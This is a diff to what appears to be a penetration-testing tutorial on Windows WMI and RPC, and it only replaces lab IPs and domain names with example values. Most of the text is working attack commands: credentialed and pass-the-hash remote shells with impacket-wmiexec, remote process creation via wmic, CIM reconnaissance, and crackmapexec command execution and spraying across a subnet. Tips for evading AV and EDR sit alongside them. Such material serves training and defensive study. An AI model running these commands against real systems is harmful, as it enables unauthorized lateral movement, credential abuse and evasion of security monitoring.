@@ -98,7 +98,7 @@ In practice this means "local admin or higher." Some specific configurations all
 ### Service scan
 
 ```shell
-sudo nmap -sV -p135 10.129.14.128
+sudo nmap -sV -p135 10.0.14.128
 ```
 
 ```
@@ -109,7 +109,7 @@ PORT    STATE SERVICE      VERSION
 The endpoint mapper itself doesn't reveal much. To enumerate the registered RPC interfaces, use `rpcdump.py` from Impacket:
 
 ```shell
-impacket-rpcdump 10.129.14.128 | head -30
+impacket-rpcdump 10.0.14.128 | head -30
 ```
 
 ```
@@ -117,19 +117,19 @@ Protocol: [MS-WMI]: Windows Management Instrumentation Remote Protocol
 Provider: wmiprvse.exe
 UUID    : 1A417CCE-FDFA-4D54-BAEE-2C36F4E5DD27 v1.0
 Bindings:
-        ncacn_ip_tcp:10.129.14.128[49664]
+        ncacn_ip_tcp:10.0.14.128[49664]
 
 Protocol: [MS-EVEN6]: EventLog Remoting Protocol Version 6.0
 Provider: wevtsvc.dll
 UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0
 Bindings:
-        ncacn_ip_tcp:10.129.14.128[49675]
+        ncacn_ip_tcp:10.0.14.128[49675]
 
 Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote Protocol
 Provider: lsasrv.dll
 UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0
 Bindings:
-        ncacn_ip_tcp:10.129.14.128[49669]
+        ncacn_ip_tcp:10.0.14.128[49669]
 
 ...
 ```
@@ -139,7 +139,7 @@ The output lists every RPC interface the host exposes, along with the dynamic po
 ### Credentialed shell - impacket-wmiexec
 
 ```shell
-impacket-wmiexec INFREIGHT/Administrator:'P4ssw0rd!'@10.129.14.128
+impacket-wmiexec EXAMPLE/Administrator:'P4ssw0rd!'@10.0.14.128
 ```
 
 ```
@@ -155,7 +155,7 @@ The `C:\>` prompt accepts commands. Each command is a fresh WMI call + SMB read:
 
 ```
 C:\>whoami
-infreight\administrator
+example\administrator
 
 C:\>hostname
 DC01
@@ -176,7 +176,7 @@ Limitations of the semi-interactive shell:
 When you don't need a session, just run one command:
 
 ```shell
-impacket-wmiexec INFREIGHT/Administrator:'P4ssw0rd!'@10.129.14.128 'whoami /priv'
+impacket-wmiexec EXAMPLE/Administrator:'P4ssw0rd!'@10.0.14.128 'whoami /priv'
 ```
 
 Runs the single command and exits. Useful for scripting (loop over a host list, run a recon command, collect output).
@@ -185,7 +185,7 @@ Runs the single command and exits. Useful for scripting (loop over a host list, 
 
 ```shell
 impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
-                 INFREIGHT/Administrator@10.129.14.128
+                 EXAMPLE/Administrator@10.0.14.128
 ```
 
 The `-hashes` argument takes `<LMHash>:<NTHash>`. Modern Windows has no LM hash so the LM portion is left blank.
@@ -194,16 +194,16 @@ The `-hashes` argument takes `<LMHash>:<NTHash>`. Modern Windows has no LM hash 
 
 ```shell
 # By IP, no domain (local account)
-impacket-wmiexec Administrator:'P4ssw0rd!'@10.129.14.128
+impacket-wmiexec Administrator:'P4ssw0rd!'@10.0.14.128
 
 # By hostname (requires DNS or /etc/hosts mapping)
-impacket-wmiexec INFREIGHT/Administrator:'P4ssw0rd!'@dc01.infreight.htb
+impacket-wmiexec EXAMPLE/Administrator:'P4ssw0rd!'@dc01.example.local
 
 # Kerberos auth (with TGT cached in KRB5CCNAME)
-impacket-wmiexec -k -no-pass INFREIGHT/Administrator@dc01.infreight.htb
+impacket-wmiexec -k -no-pass EXAMPLE/Administrator@dc01.example.local
 
 # Specify a custom destination directory (for output staging) - bypasses some AV
-impacket-wmiexec -share C$ -path C:\\Users\\Public INFREIGHT/Administrator:'P4ssw0rd!'@10.129.14.128
+impacket-wmiexec -share C$ -path C:\\Users\\Public EXAMPLE/Administrator:'P4ssw0rd!'@10.0.14.128
 ```
 
 `-share` and `-path` let you write the temp output file to a non-default location. ADMIN$ → C$ is a minor evasion; some EDR products specifically watch ADMIN$ writes.
@@ -213,18 +213,18 @@ impacket-wmiexec -share C$ -path C:\\Users\\Public INFREIGHT/Administrator:'P4ss
 `wmic` is the built-in Windows CLI for WMI. It's "deprecated" (Microsoft has been saying so since 2016) but still ships in all Windows versions:
 
 ```cmd
-wmic /node:10.129.14.128 /user:Administrator /password:"P4ssw0rd!" computersystem list brief
+wmic /node:10.0.14.128 /user:Administrator /password:"P4ssw0rd!" computersystem list brief
 ```
 
 ```
 Domain          Manufacturer            Model                     Name        TotalPhysicalMemory
-infreight.htb   VMware, Inc.            VMware Virtual Platform   DC01        4294430720
+example.local   VMware, Inc.            VMware Virtual Platform   DC01        4294430720
 ```
 
 Command execution via wmic:
 
 ```cmd
-wmic /node:10.129.14.128 /user:Administrator /password:"P4ssw0rd!" ^
+wmic /node:10.0.14.128 /user:Administrator /password:"P4ssw0rd!" ^
      process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
 ```
 
@@ -238,21 +238,21 @@ For interactive WMI queries (not command execution), PowerShell's CIM cmdlets wo
 $cred = Get-Credential
 
 # Get OS info
-Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_OperatingSystem
+Get-CimInstance -ComputerName 10.0.14.128 -Credential $cred -ClassName Win32_OperatingSystem
 
 # List processes
-Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_Process |
+Get-CimInstance -ComputerName 10.0.14.128 -Credential $cred -ClassName Win32_Process |
   Select-Object Name, ProcessId, CommandLine
 
 # List services
-Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_Service
+Get-CimInstance -ComputerName 10.0.14.128 -Credential $cred -ClassName Win32_Service
 
 # Logged-in user
-Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_ComputerSystem |
+Get-CimInstance -ComputerName 10.0.14.128 -Credential $cred -ClassName Win32_ComputerSystem |
   Select-Object UserName
 
 # List local users (security event log query - admin only)
-Get-CimInstance -ComputerName 10.129.14.128 -Credential $cred -ClassName Win32_UserAccount
+Get-CimInstance -ComputerName 10.0.14.128 -Credential $cred -ClassName Win32_UserAccount
 ```
 
 Each `Get-CimInstance` query opens a fresh DCOM/WMI session, runs the query, returns objects. Good for one-off recon; less good for executing commands.
@@ -260,16 +260,16 @@ Each `Get-CimInstance` query opens a fresh DCOM/WMI session, runs the query, ret
 ### crackmapexec wmi module
 
 ```shell
-crackmapexec wmi 10.129.14.128 -u Administrator -p 'P4ssw0rd!'
+crackmapexec wmi 10.0.14.128 -u Administrator -p 'P4ssw0rd!'
 
 # With pass-the-hash
-crackmapexec wmi 10.129.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+crackmapexec wmi 10.0.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 
 # Execute a command via WMI
-crackmapexec wmi 10.129.14.128 -u Administrator -p 'P4ssw0rd!' -x 'whoami'
+crackmapexec wmi 10.0.14.128 -u Administrator -p 'P4ssw0rd!' -x 'whoami'
 
 # PowerShell command (preferred for AV evasion via in-memory execution)
-crackmapexec wmi 10.129.14.128 -u Administrator -p 'P4ssw0rd!' -X 'whoami'
+crackmapexec wmi 10.0.14.128 -u Administrator -p 'P4ssw0rd!' -X 'whoami'
 
 # Spray across many hosts
 crackmapexec wmi 10.0.0.0/24 -u Administrator -H <hash>
